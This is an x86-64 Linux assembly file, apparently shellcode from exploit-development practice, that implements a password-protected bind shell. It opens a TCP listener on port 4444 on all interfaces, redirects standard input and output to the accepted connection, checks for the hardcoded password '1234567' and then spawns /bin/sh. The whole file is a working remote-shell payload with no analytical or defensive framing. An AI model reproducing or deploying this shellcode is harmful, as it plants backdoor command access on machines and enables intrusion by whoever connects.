global _start

_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41

	push 41
	pop rax
	push 2
	pop rdi
	push 1
	pop rsi
	cdq
	syscall

	; copy socket descriptor to rdi for future use

	xchg rdi,rax

	; server.sin_family = AF_INET
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(&server.sin_zero, 8)

	push rdx
	mov dx,0x5c11
	shl rdx,16
	xor dl,0x2
	push rdx

	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	; syscall number 49

	mov rsi, rsp
	mov al,49
	push 16
	pop rdx
	syscall

	; listen(sock, MAX_CLIENTS)
	; syscall number 50

	push 50
	pop rax
	push 2
	pop rsi
	syscall

	; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
	; syscall number 43

	mov al,43
	sub rsp,16
	mov rsi,rsp
	push 16
	mov rdx,rsp
	syscall

	; close parent
	;push 3
	;pop rax
	;syscall

	; duplicate sockets

	; dup2 (new, old)
	xchg rdi,rax
	push 3
	pop rsi
dup2cycle:
	mov al, 33
	dec esi
	syscall
	loopnz dup2cycle

	; read passcode
	; xor rax,rax - already zeroed from prev cycle
	xor rdi,rdi
	push rax
	mov rsi,rsp
	push 8
	pop rdx
	syscall

	; Authentication with password "1234567"
	xchg rcx,rax
	mov rbx,0x0a37363534333231
	push rbx
	mov rdi,rsp
	repe cmpsb
	jnz wrong_pwd

	; execve stack-method

	push 59
	pop rax
	cdq ; extends rax sign into rdx, zeroing it out
	push rdx
	mov rbx,0x68732f6e69622f2f
	push rbx
	mov rdi,rsp
	push rdx
	mov rdx,rsp
	push rdi
	mov rsi,rsp
	syscall

wrong_pwd:
	nop